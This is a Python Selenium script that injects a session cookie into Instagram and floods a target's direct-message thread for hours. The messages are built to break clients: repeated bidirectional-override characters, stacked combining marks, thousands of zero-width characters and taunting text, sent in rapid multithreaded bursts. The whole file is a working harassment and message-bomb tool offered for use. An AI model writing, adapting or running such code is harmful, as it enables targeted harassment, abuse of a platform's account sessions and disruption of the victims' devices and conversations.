# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (IMPACT FIX)
# 📅 STATUS: FORCED FOCUS | LIVE LOGS | 10 AGENTS

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- GLOBAL CONFIG ---
THREADS = 2  
TOTAL_DURATION = 21600  
BURST_SPEED = (0.01, 0.03) 
SESSION_LIMIT = 45 

GLOBAL_SENT = 0
START_TIME = time.time()
COUNTER_LOCK = threading.Lock()
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def live_logger():
    while True:
        elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - START_TIME))
        with COUNTER_LOCK:
            current_total = GLOBAL_SENT
        sys.stdout.write(
            f"\r\033[1;32m[M{MACHINE_ID}] UP: {elapsed} | "
            f"TOTAL IMPACT: {current_total} | "
            f"STATUS: PAPA POWER 👑\033[0m"
        )
        sys.stdout.flush()
        time.sleep(1)

def get_reload_breaker_payload(target):
    header = "👑 PRAVEER PAPA 👑\n"
    direction_chaos = ("\u202E" + "\u202D") * 100 
    z_tower = "̸" * 80
    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(3500))
    lines = [header, bloat]
    for _ in range(35):
        lines.append(direction_chaos + "PRAVEER_OWNZ_YOU" + z_tower)
    return "\n".join(lines)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    # Forces a large screen so the chat box isn't hidden
    chrome_options.add_argument("--window-size=1920,1080")
    temp_dir = os.path.join(tempfile.gettempdir(), f"m{MACHINE_ID}_a{agent_id}_{int(time.time())}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def adaptive_inject(driver, text):
    try:
        # Targeting multiple possible selectors for the IG message box
        selectors = [
            "//div[@role='textbox'][@aria-label='Message']",
            "//div[@contenteditable='true']",
            "//textarea"
        ]
        box = None
        for sel in selectors:
            try:
                box = driver.find_element(By.XPATH, sel)
                if box: break
            except: continue
        
        if box:
            # Force view and click
            driver.execute_script("arguments[0].scrollIntoView(true);", box)
            driver.execute_script("arguments[0].click();", box)
            # Hard injection
            driver.execute_script("""
                var el = arguments[0];
                el.focus();
                document.execCommand('insertText', false, arguments[1]);
                el.dispatchEvent(new Event('input', { bubbles: true }));
            """, box, text)
            time.sleep(0.1)
            box.send_keys(Keys.ENTER)
            return True
        return False
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global GLOBAL_SENT
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        session_start = time.time()
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(8) # Increased wait for GH Action lag
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(10) # Heavy wait to ensure DM loads

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_reload_breaker_payload(os.getenv("TARGET_NAME", "Target"))
                if adaptive_inject(driver, payload):
                    with COUNTER_LOCK:
                        GLOBAL_SENT += 1
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass 
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(1)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    
    threading.Thread(target=live_logger, daemon=True).start()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
